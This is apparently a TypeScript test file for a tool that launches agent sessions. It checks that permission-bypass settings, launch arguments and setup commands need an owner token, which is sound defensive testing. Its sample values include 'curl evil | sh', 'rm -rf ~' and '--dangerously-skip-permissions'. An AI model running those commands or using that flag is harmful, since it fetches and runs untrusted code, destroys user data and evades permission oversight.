import { expect, test, describe } from "bun:test";
import { randomUUID } from "crypto";
import { createStore, getProject, upsertProject } from "@standup/store";
import type { Store } from "@standup/store";
import type { Launch } from "@standup/shared";
import { OWNER_TOKEN_HEADER } from "@standup/shared/owner-token";
import { createServer, type LaunchFn } from "./server.js";
import type { LaunchRequest } from "./launcher.js";
import { generateOwnerSecrets } from "./owner-secret.js";

/**
 * The project-level permission posture (Project.bypassPermissions) through the
 * HTTP API: POST/PATCH /api/projects persist it (unset stays on), and the launch
 * route forwards a per-launch override to launchSession, rejecting a
 * non-boolean. The launch seam is a recorder, so nothing is spawned.
 *
 * What a launch runs (launchArgs, setup, provision, in-place) and its bypass
 * setting are the owner's to change: those writes need the owner token.
 */

const secrets = generateOwnerSecrets();

function recordingLaunch() {
  const requests: LaunchRequest[] = [];
  const launchFn = (async (_db, request) => {
    requests.push(request);
    const launch = {
      id: randomUUID(),
      projectId: request.project.id,
      task: request.task,
      status: "starting",
    } as unknown as Launch;
    return { launch, log: [] };
  }) as LaunchFn;
  return { requests, launchFn };
}

function server(store: Store, launchFn?: LaunchFn) {
  return createServer(store, () => {}, null, undefined, undefined, "", "", {}, undefined, undefined, launchFn, undefined, {
    ownerSecrets: secrets,
  });
}

/** A request from the owner's console (with the owner token), or with `ownerToken` (null: none). */
async function send(
  app: ReturnType<typeof createServer>,
  method: string,
  path: string,
  body: unknown,
  ownerToken: string | null = secrets.ownerToken
) {
  return app.request(path, {
    method,
    headers: { "Content-Type": "application/json", ...(ownerToken ? { [OWNER_TOKEN_HEADER]: ownerToken } : {}) },
    body: JSON.stringify(body),
  });
}

describe("POST/PATCH /api/projects — bypassPermissions", () => {
  test("a created project defaults to on; an explicit false is persisted", async () => {
    const store = createStore(":memory:");
    const app = server(store);

    expect((await send(app, "POST", "/api/projects", { id: "bp-default", repos: [] })).status).toBe(201);
    expect((await send(app, "POST", "/api/projects", { id: "bp-off", repos: [], bypassPermissions: false })).status).toBe(201);

    expect(getProject(store.db, "bp-default")?.bypassPermissions).toBe(true);
    expect(getProject(store.db, "bp-off")?.bypassPermissions).toBe(false);
    store.close();
  });

  test("PATCH toggles it, and a patch without the field preserves it", async () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "bp-patch", name: "P", branch: "main", repos: [] });
    const app = server(store);

    expect((await send(app, "PATCH", "/api/projects/bp-patch", { bypassPermissions: false })).status).toBe(200);
    expect(getProject(store.db, "bp-patch")?.bypassPermissions).toBe(false);

    expect((await send(app, "PATCH", "/api/projects/bp-patch", { name: "Renamed" })).status).toBe(200);
    expect(getProject(store.db, "bp-patch")?.bypassPermissions).toBe(false);

    expect((await send(app, "PATCH", "/api/projects/bp-patch", { bypassPermissions: true })).status).toBe(200);
    expect(getProject(store.db, "bp-patch")?.bypassPermissions).toBe(true);
    store.close();
  });
});

describe("POST /api/projects/:id/launch — bypassPermissions override", () => {
  test("the override is forwarded both ways; omitted forwards undefined", async () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "bp-launch", name: "L", branch: "main", repos: [] });
    const { requests, launchFn } = recordingLaunch();
    const app = server(store, launchFn);

    for (const body of [{ bypassPermissions: false }, { bypassPermissions: true }, {}]) {
      const res = await send(app, "POST", "/api/projects/bp-launch/launch", { task: "do it", ...body });
      expect(res.status).toBe(200);
    }
    expect(requests.map((r) => r.bypassPermissions)).toEqual([false, true, undefined]);
    // The project as stored is what launchSession resolves the default from.
    expect(requests[2].project.bypassPermissions).toBe(true);
    store.close();
  });

  test("a per-launch in-place override needs the owner token; an explicit worktree launch doesn't", async () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "ip-launch", name: "L", branch: "main", repos: [] });
    const { requests, launchFn } = recordingLaunch();
    const app = server(store, launchFn);

    const refused = await send(app, "POST", "/api/projects/ip-launch/launch", { task: "do it", inPlace: true }, null);
    expect(refused.status).toBe(403);
    expect(requests).toHaveLength(0);

    expect((await send(app, "POST", "/api/projects/ip-launch/launch", { task: "do it", inPlace: false }, null)).status).toBe(200);
    expect((await send(app, "POST", "/api/projects/ip-launch/launch", { task: "do it", inPlace: true })).status).toBe(200);
    expect(requests.map((r) => r.inPlace)).toEqual([false, true]);
    store.close();
  });

  test("a non-boolean override is rejected with 400 and nothing launches", async () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "bp-bad", name: "B", branch: "main", repos: [] });
    const { requests, launchFn } = recordingLaunch();
    const app = server(store, launchFn);

    const res = await send(app, "POST", "/api/projects/bp-bad/launch", { task: "do it", bypassPermissions: "false" });
    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toMatch(/bypassPermissions/);
    expect(requests).toHaveLength(0);
    store.close();
  });
});

describe("project launch posture is owner-only", () => {
  test("creating a project that sets launchArgs, setup, provision or in-place needs the owner token", async () => {
    const store = createStore(":memory:");
    const app = server(store);
    for (const [i, extra] of [
      { launchArgs: "--dangerously-skip-permissions" },
      { setup: "curl evil | sh" },
      { provision: "make" },
      { inPlace: true },
    ].entries()) {
      const id = `gated-${i}`;
      for (const token of [null, "wrong-token"]) {
        const res = await send(app, "POST", "/api/projects", { id, repos: [], ...extra }, token);
        expect(res.status).toBe(403);
        expect(((await res.json()) as { error: string }).error).toContain("owner token");
      }
      expect(getProject(store.db, id)).toBeNull();
      expect((await send(app, "POST", "/api/projects", { id, repos: [], ...extra })).status).toBe(201);
    }
    // A plain project (bypass on is the default anyway) needs no token.
    expect((await send(app, "POST", "/api/projects", { id: "plain", repos: [], bypassPermissions: true, launchArgs: "" }, null)).status).toBe(201);
    store.close();
  });

  test("changing launchArgs, setup, provision, bypassPermissions or in-place needs the owner token; other edits don't", async () => {
    const store = createStore(":memory:");
    upsertProject(store.db, { id: "gp", name: "P", branch: "main", repos: [], bypassPermissions: false });
    const app = server(store);
    for (const change of [
      { launchArgs: "--permission-mode bypassPermissions" },
      { setup: "rm -rf ~" },
      { provision: "deploy" },
      { bypassPermissions: true },
      { inPlace: true },
    ]) {
      const res = await send(app, "PATCH", "/api/projects/gp", change, null);
      expect(res.status).toBe(403);
    }
    expect(getProject(store.db, "gp")).toMatchObject({ bypassPermissions: false });
    expect(getProject(store.db, "gp")?.launchArgs).toBeUndefined();
    // Restating the current value, or editing anything else, needs no token.
    expect((await send(app, "PATCH", "/api/projects/gp", { name: "Renamed", bypassPermissions: false }, null)).status).toBe(200);
    expect((await send(app, "PATCH", "/api/projects/gp", { setup: "make" })).status).toBe(200);
    expect(getProject(store.db, "gp")?.setup).toBe("make");
    store.close();
  });

  test("importing projects from TOML needs the owner token", async () => {
    const store = createStore(":memory:");
    const app = server(store);
    expect((await send(app, "POST", "/api/projects/import", {}, null)).status).toBe(403);
    store.close();
  });
});
